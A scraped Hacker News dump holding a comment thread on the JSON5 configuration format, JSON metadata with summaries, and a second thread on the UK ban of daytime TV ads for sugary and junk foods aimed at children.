No template literals (backticks) No regex literals No octal numbers (0123, 0o123) No boolean numbers (0b1001) No big ints (the \"n\" suffix) reply brap 10 hours agorootparentMost of these things seem like missing features that would fit right in. Except for maybe template strings which could contain references to template functions reply Silphendio 18 hours agoprevI find json5 much better than json, but it has still many of the same annoyances. - instead of trailing commas, how about making them completely optional? It's not like they are needed in the first place. - curly braces for top-level objects could be optional too. - For a data exchange format, there should really be a standard size for numbers, like i32 for integers and f64 for floats. - parsing an object with duplicate keys is still undefined behavior. reply hgs3 13 hours agoprevI'm looking at the JSON5 spec and it appears it does not introduce a capital \\U escape sequence for Unicode characters outside the Basic Multilingual Plane (BMP). It's not brought up often, but in JSON you do need UTF-16 surrogates to write an escape sequence for Unicode characters outside the BMP. Consider the Hamburger Emoji (U+1F354). Instead of escaping it as \"\\U0001F354\", you need to escape it with UTF-16 surrogates \"\\uD83C\\uDF54\". This is both cumbersome for humans and not in accordance with the Unicode Standard [1]. It's ironic, but many (most?) of the \"JSON for Humans\" flavors of JSON tend to overlook this. [1] See Chapter 3.8 \"Surrogates\" of the Unicode Standard. reply maxloh 12 hours agoparentWhen you export Instagram data as JSON, the resulting JSON files include encoded strings like \"\\uD83C\\uDF54\". Parsing and converting these strings can be cumbersome because a single Unicode character is often represented by a single escape sequence, but sometimes it requires two. reply fanf2 6 hours agoparentprevThere’s no \\U in JavaScript: it is spelled \\u{10ffff} reply Dylan16807 13 hours agoparentprevHow often are humans going to be using unicode escape sequences? reply maxloh 12 hours agorootparentI believe in most cases, they are generated by programs. Refer to my other comment for real-world examples. reply mifydev 17 hours agoprevI don’t know how to feel about this. Personally I want to write configs like code, and I want to avoid using yet another specific DSL for it. So currently working on a tool that allows you to write configs in Typescript - https://github.com/typeconf/typeconf reply jwblackwell 5 hours agoprevIt feels like AI has made this redundant. I honestly cannot imagine hand typing out some JSON now, or most code for that matter. I just write in natural language what I want and the AI will perfectly output valid JSON. reply int_19h 1 hour agoparentThat JSON you get might be syntactically valid, but how do you know that it is accurate wrt your original input? That, for example, no values have a one-character-off misspelling? reply solardev 5 hours agoparentprevJust being able to add comments to a .JSON5 file is a godsend though, no matter who/what created it. Oh... and TRAILING COMMAS! reply DrScientist 7 hours agoprevThis may be heretical but surely the problem isn't lack of comments et al in JSON, rather that people try to use JSON for everything, when it was designed to be a text representation of javascript objects? reply Sankozi 4 hours agoparentIf it was really designed for representing JS objects then it was really bad job. Neither JSON supports JS objects (lack of NaN) nor JS supports JSON (lack of arbitrary precision decimals). reply DrScientist 1 hour agorootparentFair enough - perhaps I should have said it was inspired by Javascript literal syntax and simplified to make it a platform independent data exchange format and not a application configuration format. Though I can see how the latter is tempting if your application is in JS. reply epscylonb 20 hours agoprevI've always been a big fan of KDL in principle, haven't used it in anger. After that HCL, then YAML, with JSON and others being my least favourite to use. Of course the hard part is gaining enough critical mass to make a significant switch. JSON had AJAX. YAML had Rails. What could make JSON5 or KDL break out? reply ruuda 20 hours agoprevIf you're looking for a human-friendly json superset (comments, non-quoted keys) that can also abstract away repetitive configuration with variables and list comprehensions, check out https://rcl-lang.org/. reply 11235813213455 57 minutes agoprevonly needs trailing commas reply veesahni 15 hours agoprevThis is very close to what the ruby REPL will accept. I tried to paste in the kitchen sink - it didn't like dangling decimals and the comment format, everything else worked as expected. reply teddyh 18 hours agoprevI always thought that “JSON5” is a deceptive name. It is not the fifth version of JSON; it is an alternative/extension of JSON, of which there are many alternatives, and this one is no more official than any other. reply Zamicol 18 hours agoparentJSON5 is from ECMAScript 5.1, which is called ES5. As an (unfortunate) JavaScript developer, it was clear to me the intent was to \"update\" JSON with ES5 features, and not say ES4 or ES6. Why ES5? ES5 is when trailing commas were introduced. Commas are one of defining features of JSON5. Other languages, like Go, also made this a priority. reply teddyh 18 hours agorootparentThe name may have a logical reason for being what it is. But it is still misleading. I have seen people implicicly assume that JSON5 is what they should be using instead of JSON, just because of the name. reply efitz 14 hours agoprevIf it’s designed for hand authoring it should support an ISO8601 date format; mere mortals cannot author numeric timestamps without tools. reply The_Colonel 14 hours agoparentJust store the ISO9601 date/time in a string. No need for special support on the format level. reply eadmund 6 hours agorootparentWhy have numbers, true, false or null then? Why not only support strings? {\"foo\": \"2\", \"bar\": \"null\", \"baz\": \"false\"} I’m not really being facetious: that’s what canonical s-expressions did: ((foo 2) (bar null) (baz false)) reply The_Colonel 4 hours agorootparentIt's of course a trade-off in how far you want to go with special types. Booleans and numbers have extremely common use cases, moreso than date/times. But perhaps more importantly, they are quite easy to define. Date/time is a susprisingly complex topic with many variants (date, time, datetime, local/relative date/time, point in time, offset-based, timezone-based...) with all of them being quite important. The spec to define date/time types would likely be longer than for the whole rest of JSON, and you still wouldn't be able to correctly interpret the date/time from the spec alone, since timezone data/designations are dynamic. Now the question is - what value does this extra complexity bring? I'm not saying there isn't any, but it doesn't seem to justify the cost. reply int_19h 1 hour agorootparentNumbers aren't \"surprisingly easy to define\". Indeed, JSON is a very good example of how to not define numbers for interoperability. The original spec literally doesn't place any limits on valid ranges, precision etc, with the result that the later RFC notes that \"in practice\" you probably want to assume 64-bit floating point because that's what most parsers use (but still doesn't actually guarantee at least that much precision!). reply efitz 5 hours agorootparentprevType declarations can imply syntax, semantics or both. Yes, you could represent everything as a string; in that case, the serialization format is no longer providing any assistance in verifying or enforcing syntax. But it’s often useful to be able to verify syntax independently. And it helps avoid authoring errors (like using “1” instead of “true” etc.) that are ambiguous if your only hint is semantic. reply eadmund 5 hours agorootparentIn that case one should also have a type for dates. What I’m getting that is that a format ought to commit. reply ianbicking 19 hours agoprevI like JSON5 and have used it some. When GPT was younger and I was parsing its JSON output directly, JSON5 was forgiving in useful ways. The one thing I really wish it had was some form of multi-line string, mostly so I could use it with line diffs. Also sometimes for really simple property editors it's nice to put the serialization in a textarea, and that works fine for everything but multiline strings. (I suppose you can escape newline characters to put a string on multiple lines, but I find that rather inhumane and fragile) reply kylelahnakoski 19 hours agoparentHjson! reply ianbicking 18 hours agorootparentOh! Format preserving editing too, very nice... https://github.com/hjson/hjson-js?tab=readme-ov-file#modify-... reply peterkos 15 hours agoprevWhat is the benefit of this over something like Pkl[0]? Pkl compiles down to JSON, YAML, etc., but the language itself is user-friendly. This way you get best of both worlds: readable and editable for humans, and parsable for computers. [0]: https://pkl-lang.org reply mariocesar 3 hours agoprevIsn't this simply YAML but with curly braces? Another thing is that It feels wrong to have comments in JSON, like allowing comments in CSV files. reply amelius 19 hours agoprevThe only thing I worry about is how do you parse this, then modify some fields and write back the file with all the comments still in place? reply magospietato 19 hours agoprevWhy not just not use JSON for config? In a sane world YAML wouldn't even exist and everyone would use something like TOML. reply eviks 14 hours agoprev> JSON for Humans The emoji in the first paragraph seems to convey the understanding that humans like expressiveness, but the format itself doesn't allow Unicode values in keys, which seriously limits said expressiveness... reply lambda 16 hours agoprevI find that these efforts to make something that is almost but not quite JSON to be counterproductive. It means that something you can't tell if it's JSON or another format. You'll have some tools that can work with it, while other tools will choke because they expect valid JSON. Oh, someone just switched the quoting style so now your jq based automation is all broken. And now you have to figure out which of these not-quite-JSON formats this is. Is it HuJSON/JWCC? Is it JSON5? Does my editor have a mode that supports this particular variant, or am I always going to be fighting with it? And finally, having used HuJSON for Tailscale config: the issue isn't just things like comments and trailing commas, or quoting styles. JSON is just a kind of heavyweight and cumbersome syntax for writing config files. I find that I prefer writing a script to auto-generate my Tailscale config, because editing it by hand is cumbersome. There are a number of other possible config file formats, with varying levels of JSON data model compatibility. YAML has its issues, but we've all learned to live with them by now. TOML isn't bad, though good luck remembering the array of tables syntax. KDL is pretty nice; it has a slightly different data model than JSON, but it's actually one that is somewhat better suited for config files. I'd rather use any of these for config files than something that is almost, but not quite, JSON. reply berdon 19 hours agoprevShameless plug for my JSON/5 parser written in zig: https://github.com/berdon/zig-json There is a std json library as well but the aesthetics weren’t great imo. The specs are quite pleasant to implement. reply ddgflorida 17 hours agoprevThe \"official\" JSON should be enhanced to cover a few of the pain points. reply AdieuToLogic 19 hours agoprevI find HOCON[0] to be great for this need in JVM-based languages. 0 - https://github.com/lightbend/config/blob/main/HOCON.md reply travisgriggs 18 hours agoprevI wish json had a simple version/convention like elixir sigils so I could pass datetimes around as first class entities instead of always having to [de]stringify them. reply matt3210 17 hours agoprevYaml is for people, json is for machines reply bogota 16 hours agoprevJust use jsonnet if you want this IMO. No need to change json into yaml. reply reissbaker 16 hours agoparentSwitching from JSON to Jsonnet to get comments and trailing commas is like switching from a butter knife to a chainsaw because your steak is too tough. Jsonnet is literally Turing-complete! reply righthand 19 hours agoprev` leadingDecimalPoint: .8675309, andTrailing: 8675309.,` Sorry but what is the benefit of this? Lazy shorthand? This is too much. Is this a string in other languages? PHP the `.` is a string concat. reply cute_boi 20 hours agoprevIf browser/node etc.. starts to support json5, i am sure it won't take that much time to get adopted. reply qwertox 20 hours agoprevComments are nice. I wonder if they can also be inserted programmatically. reply VTimofeenko 20 hours agoparentIt kinda becomes a question of \"does this comment annotate the line it's on, the next one, or the arbitrary number of succeeding lines\" since the order of the objects is not guaranteed by the standard and when writing comments by hand it's common to say \"the next section shall do X\". reply int_19h 1 hour agorootparentI wish languages adopted structured comments (as in, semantically applying to syntax tree nodes rather than lines) more broadly. It used to be a thing in some early PLs but has mostly died out. reply usrusr 18 hours agorootparentprevWhen I work on some ad hoc configuration format I usually end up with quite a family of different comment types. Disabled values and prose about values are are the core set, but there might also be different prose types to separate the intention for a certain value (authored by the one setting the value) from documentation about the purpose of the field (authored by the one introducing the option). Also a type for key value pairs that have not been consumed (perhaps because of a typo in the key), and another for pairs that are applied as default, but should not be explicitly in the config if you want to go with the new default of they change in a software update. Yes, this is for situations where the config is two way, e.g. when a GUI can be used to set some values. But I find some of those features so useful that I might sometimes be tempted to write out a processed version of the file parsed even when there isn't anything like a configuration UI. reply VTimofeenko 17 hours agorootparentI am using nickel[1] myself for writing what basically amounts to a pipeline that ultimately generates a json or toml. It has contracts that can validate a field or an object as well as set a default value if the field is not present. [1]: https://nickel-lang.org/ reply c-smile 15 hours agoprevEh, if you drink, then drink... 1. Add `;` as a separator of elements, so you may have: { a: \"foo\"; b:\"bar; } 2. Add array tags and space separated value lists so you may have { a: 12 13 14; } to be treated as [12, 13, 14] with the tag \" \". Normal arrays are parsed with the tag \",\" 3. Add \"functors\" as, again, tagged arrays rgb(128,128,14); will be parsed to an array with the tag \"rgb\". Also you may have calc(128 + 14); 4. Add tagged numbers so 90deg will be parsed as a number with the tag \"deg\" And you will get pretty much CSS that is proven to define quite complex constructs with minimal syntax. reply hi_hi 20 hours agoprevIsn't JSON for humans essentially YAML? (only kinda joking) reply sevensor 20 hours agoparentThat was the idea, before it all went terribly wrong. reply Vegenoid 19 hours agorootparentTo the reader: if you haven't before, take a stroll through the YAML spec to see what people are talking about when they bemoan its complexity: https://yaml.org/spec/1.2.2/ Then take a look at the JSON spec: https://datatracker.ietf.org/doc/html/rfc7159 reply Zamicol 18 hours agoprevI'm a huge fan. We use it for all our configs. reply up2isomorphism 12 hours agoprevNo I don’t need this thing. reply andy_ppp 10 hours agoprevUnfortunately this is basically that XKCD cartoon about proliferating standards. I think I’d avoid this additional standard and just use JSON or a JavaScript object if I really need this level of flexibility. reply 65 2 hours agoprevWhy not just use YAML at that point? reply ultimoo 12 hours agoprevcan this be used to convert llm output to json? reply guilhas 19 hours agoprevHjson looks friendlier for direct manipulation, no string quotes What would be the advantages/disadvantages? https://hjson.github.io reply throwawee 14 hours agoparentI use it for personal scripts and it's been wonderful. I get to write more beautiful and concise configuration than any other format I've used. If I were doing a professional project, I'd be hesitant to use it over something with more popularity and support. The syntax has so many variations two files can look like two totally different config languages, which is both cool and alarming. reply stickfigure 19 hours agoprevStill no timestamps :-( reply Zamicol 18 hours agoparentWhat's wrong with Unix? Or is the complaint that there's no data type for time stamps specifically? I agree it would be nice to have something with more data types. Binary b64/hex would be nice. reply eadmund 6 hours agorootparent> What's wrong with Unix? When you read 847548, is that a number or is that Saturday, 10 January 1970? Having a type removes that ambiguity. It would be more JSONish for it to be human readable, maybe @1970-01-10T19:25:48. reply Dylan16807 16 hours agoparentprevFor a basic timestamp use a number. If you need more, you enter territory that is much too complex to build into the \"simplest data format\" spec. reply dzsekijo 18 hours agoparentprevYeah. But I think the goal was here to sugar the syntax while keeping semantics intact. reply counterpartyrsk 18 hours agoprevKISS reply rk06 15 hours agoprevNow, it would be great if we have parsers, editor plugins and json schema supprot as well. until then, jsonc works for me reply lakomen 6 hours agoprevOh he'll no not another standard no one needs. JSON is good enough reply Waterluvian 17 hours agoprevI think the killer feature of JSON is that there’s one version and that won’t ever change. You don’t have to think about compatibility. All JSON is valid YAML. So you clearly can make yet another one of these and make it support JSON. But JSON doesn’t support the stuff you’re adding, so calling it JSON5 just makes things confusing as if it’s a version and not a whole new thing altogether. The ugliest thing the authors could a",
    "originSummary": [
      "JSON5, an extension of JSON, is designed for easier manual editing, making it ideal for configuration files but not suitable for machine communication.",
      "Since its launch in 2012, JSON5 has gained significant popularity, with over 65 million downloads weekly, and is utilized by major projects like Chromium and Next.js.",
      "JSON5 is a superset of JSON, incorporating ECMAScript 5.1 features, allowing for flexible syntax, and is compatible with ES5, with a JavaScript library available for parsing and serialization."
    ],
    "commentSummary": [
      "JSON5 is an extension of JSON designed to be more human-friendly by allowing features such as comments and trailing commas.",
      "There is a debate on whether JSON should remain simple or evolve with additional features, as seen with JSON5, which is not an official update but an alternative format.",
      "Some suggest using other formats like TOML or HJSON for more human-readable configurations, highlighting the ongoing discussion about JSON's evolution."
    ],
    "points": 328,
    "commentCount": 300,
    "retryCount": 0,
    "time": 1733693345
  },
  {
    "id": 42359836,
    "title": "UK bans daytime TV ads for cereals, muffins and burgers",
    "originLink": "https://www.france24.com/en/live-news/20241204-uk-bans-daytime-tv-ads-for-cereals-muffins-and-burgers",
    "originBody": "HOME LIVE NEWS UK bans daytime TV ads for cereals, muffins and burgers London (AFP) – The UK government is banning daytime TV adverts for sugary foods like granola and muffins in its battle against child obesity, branding such popular items as junk food. Issued on: 04/12/2024 - 14:47 Modified: 04/12/2024 - 14:45 1 min After the watershed: A McDonald's burger © SCOTT OLSON / GETTY IMAGES NORTH AMERICA/AFP Under measures unveiled on Tuesday, ads showing \"less healthy\" food and drinks will only be allowed to be aired after the 9:00 pm watershed from October next year. According to the National Health Service, obesity is rising among British kids with one in 10 four-year-olds now considered to be obese. And one in five five-year-olds suffers from tooth decay from eating too much sugar. Also included on the government's list -- which uses a scoring system based on each item's sugar, fat and salt content -- are pre-packaged popular sugary breakfast foods such as croissants, pancakes and waffles. \"Breakfast cereals including ready-to-eat cereals, granola, muesli, porridge oats and other oat-based cereals\" are included, the government said. Also on the banned list are products such as chickpea or lentil-based crisps, seaweed-based snacks and Bombay mix as well as energy drinks, hamburgers and chicken nuggets. But the new restrictions will not apply to healthier options such as natural porridge oats and unsweetened yoghurt. The government hopes the new measures could help prevent some 20,000 cases of childhood obesity a year. \"Obesity robs our kids of the best possible start in life, sets them up for a lifetime of health problems, and costs the NHS billions,\" Health Secretary Wes Streeting said. \"This government is taking action now to end the targeting of junk food ads at kids, across both TV and online.\" © 2024 AFP Today's top stories Live: Thousands gather at Syria’s notorious Sednaya prison to look for missing relatives Live Middle East Iran in a ‘position of unprecedented weakness’ after the fall of Assad in Syria Middle East Drug lord musical ‘Emilia Pérez’ leads Golden Globe nominations with 10 nods Culture Oil giant BP to ‘significantly reduce’ investment in renewable energy for rest of decade Europe From ashes to glory: The revival of Paris's Notre-Dame Cathedral France ADVERTISING Most read 1 Notre-Dame Cathedral rises from the ashes in grand reopening ceremony As it happened Europe 2 Macron, Trump, Zelensky hold trilateral on sidelines of Notre-Dame ceremony France 3 Syria's Assad and his family arrive in Moscow after Russia grants them asylum As it happened Middle East 4 Rebels enter Syrian third-largest city Homs, says war monitor As it happened Middle East 5 HTS rebel group sweeping Syria tries to shed its jihadist image Analysis Middle East 6 Ghana opposition candidate John Mahama wins presidential election Afrique",
    "commentLink": "https://news.ycombinator.com/item?id=42359836",
    "commentBody": "UK bans daytime TV ads for cereals, muffins and burgers (france24.com)273 points by ivewonyoung 23 hours agohidepastfavorite303 comments Winblows11 22 hours agoWhat about adverts on YouTube and TikTok and other online platforms? I doubt kids/teenagers watch much TV at all these days. reply crowcroft 21 hours agoparentIt baffles me that more countries haven't put legislation in place to severely limit what ads can be served to under 18 year olds (or at least under 16). I worked in an ad agency a number of years ago, and Phillip Morris approached us with a deliberate plan to launch big budget ad campaigns on social media platforms specifically because they could get in front of younger demos more easily (traditional media having existing regulations in my country). The original idea was to build a large database of prospects to sell direct to even after regulation eventually cracks down on them. Amazingly no regulation has come yet, and Meta has done little to no self-regulation. You can blame parents, but even then one under appreciated problem with digital ads is the lack of shared experience. With TV advertising, you know what your kid is seeing, everyone can see a verify what ad ran at what time on what channel etc. If a parent and a kid are scrolling social media their experience is entirely different, and you can't go back and see what someone else has seen. reply Fnoord 5 hours agorootparentMy kid recently got a second hand iPad tablet. On it, she uses YouTube Kids. I made an account for her. Now, they ask _me_ for consent, since she cannot legally give it. They throw ads at her about toys, but this is illegal in my country to target children with ads. Ads are supposed to target parents, not kids. Now, if it were one ad at start, I'd hate it, but they go further: in a 10-minute movie, the thing quits like 3 times to show my kid an ad. She barely has the attention span to watch the bloody vid! You know why they do it? Not because it is legal; because they get away with it. Law is irrelevant if it isn't uphold. reply dghlsakjg 59 minutes agorootparentYou have the power to stop this: disable the app if you believe the ads are harming your child, or opt to pay for YT or another kids video service that doesn't serve ads. One issue is that YT is possibly violating the law. A separate issue is that parents are allowing children to continue consuming harmful ad content on an app. reply crowcroft 3 hours agorootparentprevThat’s the other thing as well, we need to spend more time upholding laws that already exist instead of getting distracted with these weird news publisher content regulations like Canada has. reply troyvit 2 hours agorootparentAnd Programmatic advertising makes this extremely difficult. Once you add a giant, automated ad exchange to advertising you've created opaque supply chains that help make it trivial to obfuscate who actually makes money from an ad. This article on ad fraud goes into more detail: https://xenoss.io/blog/programmatic-ad-fraud-detection reply crowcroft 2 hours agorootparentAgree on issues with programmatic. Compared to the number of dollars, and in particular number of dollars being spent on ads served to under 18s, programmatic is a rounding error compared to Google, Meta, TikTok etc. https://www.emarketer.com/uploads/pdf/US_Ad_Spending_2023.pd... reply troyvit 35 minutes agorootparentWhoah good point. Man for how small that market is they sure spend a lot of time screwing it up. Given their closed systems, do Google, Meta and TikTok have tighter controls over ads served to kids that they just aren't applying, or is it something else? reply EasyMark 17 hours agorootparentprevProbably because being tracked across all platforms is a bad idea in a democractic/liberal type of country, and not worth the \"think of the children\" argument. At some point parents have to take some responsibility. reply ben_w 3 hours agorootparent> At some point parents have to take some responsibility By voting for the party that promises to enforce bans against it? There's more than one way to be responsible, and it's not good to be a \"helicopter parent\" even if you have enough free time to actually pair-browse the internet with your kid, and even if you did that doesn't stop them seeing inappropriate content or ads it just means there's a witness who knows they saw inappropriate content or ads. reply crowcroft 15 hours agorootparentprevFirst, I’m not sure being tracked across all platforms is actually a requirement here. On device age verification and device attestation and/or simply assuming anonymous users are under 18 from an ad safety perspective would allow a level of anonymity across platforms. It might also help solve a large chunk of ad fraud. Second, I think you really need strong evidence to say that the upside you’re asserting is truly worth sacrificing kids safety. reply xxs 22 hours agoparentprev\"This government is taking action now to end the targeting of junk food ads at kids, across both TV and online.\", it's a quote from the article, it's very likely they'd ban ads targeted at children. reply pkaye 11 minutes agorootparentAccording to this link Food and Beverage ads are already prohibited on YouTube kids. I don't know if this is a US specific policy but I presume its similar elsewhere. https://support.google.com/youtube/answer/6168681?hl=en#zipp... reply anotheracc88 21 hours agorootparentprevFor Youtube often the content is an ad too. Will Google need to stop serving huge swaths of content to the UK at certain times? Hope so! reply xxs 1 hour agorootparent>content to the UK at certain times? Hope so! We have no idea how/where it'd end up (with). If I understand anything about regulations (which is doubtful of course), the advertisers, themselves, would be on the hook. reply dartos 4 hours agorootparentprevI got news for you. Kids entertainment has almost always been ads. Disney movies are marketing for toys. Same with TV shows and cartoons. reply chgs 22 hours agorootparentprevI expect a lot of pushback from the new u.s administration about any online regulations. reply xxs 21 hours agorootparentThe regulation would apply to the UK. UK brands and goods sold in the UK, by established/registered companies the UK. Not possible to sell any retail goods of the sorts w/o a registration in the UK, so stopping them advertising won't be hard. I don't think US administration would be able to do anything, much like GDPR. reply spacebanana7 4 hours agorootparentWhat about Mr Beast video sponsored by McDonalds (for the sake of specificity, a new McMuffin available in every country on earth)? > I don't think US administration would be able to do anything, much like GDPR. We live in a different world to the mid-late 2010s. For better or worse, I'm fairly confident Musk and Zuckerberg will have input on US trade policy on these issues. reply xxs 1 hour agorootparentMcDonalds is likely to be responsible for the contents in that regard I'd presume (esp since they do own the trademark). This is what I meant by corporations registered in the UK. In a similar vein gambling content targeted at kids would have a similar approach. Keep in mind the businesses still need to be able to sell in the UK. reply ben_w 3 hours agorootparentprev> For better or worse, I'm fairly confident Musk and Zuckerberg will have input on US trade policy on these issues. Input, yes. May even be able to get the US to threaten a trade war or to leave NATO if they can't rake in the advertising dollars. But I think the former would be seen as Trump being Trump and the latter as a bluff, and in both cases it would be reason to more permanently disentangle the UK economy from the US economy and defence relationship than to dry away the crocodile tears of multibillonaires. reply spacebanana7 3 hours agorootparentThe US has more leverage over the UK then perhaps any other country. Largely because of the shared political culture. They could throw hand grenades into British politics by declassifying embarrassing events involving British soldiers in Iraq, investigating tax issues with labour party donors (many of whom conduct business in the US) or recognising Northern Ireland as part of the Republic of Ireland. Attacking the British economy would be a political mistake, because a well advised politician would use it as a scapegoat for any economic problem in the UK. Similar with defence - e.g the withdrawal of intelligence cooperation could allow a terrorist attack to be blamed on Trump rather than MI5/MI6 funding stress. reply ben_w 1 hour agorootparentSeems plausible, though I still think the US threatening to do that, let alone actually doing that, is more likely to cause a separation between the US and UK than to be taken seriously (in the sense of getting the UK to change course). The UK did just go through having Boris Johnson as Prime Minister, after all, who spent his time in office demonstrating that being completely shameless is a viable solution to almost all blackmail — he only fell when there were photos of him partying in the same period he was on TV telling people they couldn't do that or visit dying relatives because COVID lockdown, everything else wrong was basically ignored. reply chgs 20 hours agorootparentprevTarrifs and other threats reply bko 4 hours agoparentprevIf your child watches a lot of YouTube, or any at all really, you should really invest in YouTube premium. It's incredible how much people use YouTube but because there is a free option, few bother to fork over $14 a month to remove ads, especially when it vastly improves the experience for your children. In a case like this I think the obvious solution is self-regulation. reply amelius 21 hours agoprevCan we have one or several months without ads of any kind? Perhaps then we can appreciate a world without ads more. It might also reduce the environmental burden of overconsumption. reply dylan604 21 hours agoparentIt is amazing when you visit a city that has banned billboards especially when coming from one that does not. It's the same (opposite) feeling you get when watching an ad free streaming service and the switch to live TV or Prime. Which is just like switching to a browser with out uBO. If society went 30 days with a universal uBO experience, I think all wars would end, cats & dogs sleeping together, shields would become plow. You know, basically peace on earth. reply Fnoord 4 hours agorootparentEvery once in a while I end up with a browser without adblocker. It baffles me how anyone would want to use the WWW like that. I cannot fathom, they're missing out, but at the end: those people plus the ones paying for services (which is sometimes me) are financing the platforms. reply kjkjadksj 55 minutes agorootparentWell, allegedly funding their platforms. Not all ads convert. reply alecco 20 hours agoparentprevIMHO the only way they'll pay attention if enough of us turn it all off. reply petesergeant 21 hours agoparentprevMove to the UK and only watch the BBC, and yes reply aembleton 9 hours agorootparentPlenty of guests on shows promoting a new film or book. We still have billboards advertising stuff. reply b800h 20 hours agorootparentprevThat's not ad-free. You have to put up with ads for a load of BBC programmes which will almost inevitably contain a slew of progressive messaging. reply tonyedgecombe 5 hours agorootparentThe BBC is ad free in the UK. reply Fnoord 4 hours agorootparentNot whole UK, as they've been banning VPNs from iPlayer. reply ApolloFortyNine 22 hours agoprevI could see supporting with this, but it does seem like an abuse of the 'for the children' argument for this. Children pretty much have to eat what you give them until they get a job. Also some chicken nuggets are bad, but some average a gram of protein per 10 calories, which is a pretty good ratio, and especially for frozen food. Can't help but think this is too broad. reply anotheracc88 21 hours agoparentThis is not systems thinking though. It take a lot of will for parents to fight kids desire for junk food from social pressure alone. Should parents be perfect citizens that make 10000 correct micro decisions a month correctly every time? Or can society help a bit by blocking some of the predators? It is like \"just say no\". Thay'll do it for drug addicition. Simple. reply Cthulhu_ 21 hours agoparentprev> Children pretty much have to eat what you give them until they get a job. I don't believe you have children of your own; is this an armchair opinion or your own lived experience? Anyway while on paper this is true, in practice kids will ask for this and may get it as a treat, or they may get it from somewhere else. And as a one-off, that's fine, but they do get influenced by ads to want more of it at any time. Same with fast food chains, somehow the ones that aren't available where I live got an almost mythical status with the teenager here. A Taco Bell did open here but honestly it was mediocre and overpriced. reply xxs 21 hours agorootparentTeens and so would be given money to buy food themselves, e.g. before/after going to football training, swimming, dancing etc. Indeed, it's unrealistic to expect all kids would be served food and observed while eating. reply WD-42 20 hours agoparentprev> Children pretty much have to eat what you give them until they get a job. If true why do cereal companies spend billions on advertising directly to children? For the fun of it? reply phyzix5761 20 hours agorootparentI think its so children are open to eating it after the parents have bought it. If the food doesn't look appealing the parent will have to work harder but its the parents making the food choices not the child. Most of the time children don't even go to the grocery store with their parents. reply NicuCalcea 18 hours agorootparentSo parents buy unhealthy food for their children without any prompting, and the kids need to have their minds opened to it by advertising, otherwise they wouldn't it? reply phyzix5761 17 hours agorootparentI'm sure the cartoons and colors help the kids get motivated to eat the cereal reply WD-42 17 hours agorootparentI'm pretty sure the massive amounts of sugar is all the motivation they need. reply phyzix5761 16 hours agorootparentHow do they know it has sugar just by looking at the food or the packaging? reply WD-42 19 hours agorootparentprevTell me you have never had kids without telling me you’ve never had kids. reply phyzix5761 19 hours agorootparentI have children reply bobthepanda 22 hours agoparentprevmore so in the past, there was a lot more food advertising directed at kids, because the thought was that kids could annoy their parents enough to drag the whole family to an establishment. and some marketing tricks work a lot better on children because of their social settings and general impulsiveness (e.g. \"All the cool kids have Lunchables\") reply chgs 21 hours agorootparentThe milky bar kid is strong and tough The red car and the blue car had a race Turn the milk chocolatey Keep hunger locked up tip lunch I have tried to avoid adverts for 20 years, but the adverts of my childhood (not just ones aimed at kids - autoglass repair and replace, safe style do buy one get one free, dfs sale ends Sunday, ronseal quick drying wood stain does exactly what it says on the tin) The brainwashing is sickening. reply ben_w 3 hours agorootparent> autoglass repair and replace, safe style do buy one get one free, dfs sale ends Sunday, ronseal quick drying wood stain does exactly what it says on the tin A golem carved out of butter playing a trombone, an animated blue telephone, a puppy stealing toilet paper, Boddingtons. Same vibes, different details. reply robertlagrant 4 hours agorootparentprevAll red wants to do is stuff his face! Overeating bad, according to that ad. Other than Milky Ways. reply laurieg 18 hours agorootparentprevI still remember phone numbers from radio ads I heard as a kid. I don't have any phone number memorized apart from my own reply WWLink 19 hours agorootparentprevHEAD ON! APPLY DIRECTLY TO THE FOREHEAD!!!!! reply akira2501 20 hours agoparentprev> Children pretty much have to eat what you give them until they get a job. So.. then.. why are we advertising to them _at all_? reply petesergeant 21 hours agoparentprev> Children pretty much have to eat what you give them until they get a job. I don’t think this is true in practice; it feels sufficiently obvious that children’s tastes influence what they get fed that I’m not going to bother to find a citation reply worble 20 hours agoparentprev>Children pretty much have to eat what you give them until they get a job. Damn, someone better ring up the cereal companies and tell them to stop advertising, I bet they'll feel foolish realizing they've wasted all that money! reply Pet_Ant 22 hours agoprevWell I didn't understand how -besides the cereals maybe- are unhealthy > Breakfast cereals including ready-to-eat cereals, granola, muesli, porridge oats and other oat-based cereals. until I re-read and saw this: > But the new restrictions will not apply to healthier options such as natural porridge oats and unsweetened yoghurt. So I think it's not clear in the first sentence but \"ready-to-eat\" is meant to apply to all the items in the list and not just the cereals. reply KaiserPro 22 hours agoparentIts the cereal industry being bastards again. Breakfast cereals contain a colossal amount of sugar, and are a great way to keep your diabetes on its toes. They haven't been healthy for years, moreover the toys they put in them have been shit as well. reply Cumpiler69 21 hours agorootparent>moreover the toys they put in them have been shit as well That's what pisses me the fuck off. Even Kinder toys have been shit for decades. reply razakel 3 hours agorootparentprevIf they didn't fortify breakfast cereals then they'd be about as nutritious as the box they came in. reply deskr 22 hours agoparentprevIt's very strange they say porridge oats are banned, then go on saying \"natural porridge oats\" are not. In my mind porridge oats are natural and you don't have to say that. If you have something else you need to say so. reply dmart 22 hours agorootparentI’m assuming they mean stuff like Quaker oatmeal packets which are half sugar. reply hombre_fatal 18 hours agorootparentUnfortunately you're probably right. When \"oats\" may refer to those sugar packs it kinda shows how bad our food habits and norms have fallen. reply jay_kyburz 22 hours agorootparentprevMy kids love natural porridge, however there is a constant battle about how much honey they are allowed to drown them in. :) reply chrisjj 21 hours agorootparentI am amazed honey is not on this list of \"junk\" foods. reply fy20 18 hours agorootparentThe highly processed stuff found in supermarkets definately should be. If you haven't ever tried real honey, go find some and thank me later. reply Dylan16807 20 hours agorootparentprevAre any other toppings on the list? If it's just standalone foods I'm not surprised. reply datavirtue 20 hours agorootparentprevIt's on mine. Refined sugar with water, pure and simple. It doesn't get a pass. reply beejiu 21 hours agorootparentprevThey are not banned. They are on \"the list\" (as the article says) meaning they must be scored using the \"NPM model\". Only scores exceeding 4 are \"banned\", which will include sweetened oats. reply deskr 15 hours agorootparent>must be scored using the \"NPM model\". Only scores exceeding 4 are \"banned\", which will include sweetened oats Thanks. Do you have a link to \"the list\" and this NPM model scoring system? reply aembleton 9 hours agorootparenthttps://assets.publishing.service.gov.uk/media/5a7cdac7e5274... reply beejiu 21 hours agoparentprevThere's a lot of misinformation going around about how the legislation works. All porridge oats are \"in scope\" of the regulation, which means they need to be scored using the \"Nutrient Profile Model\" score before being advertised. The result is that porridge oats are not banned, but golden syrup instant porridge oats will be. Here's the scoring model: https://www.gov.uk/government/publications/the-nutrient-prof... reply seabass-labrax 20 hours agorootparentDo you think this is worth posting as a top-level comment? There's already lots of speculation in this thread 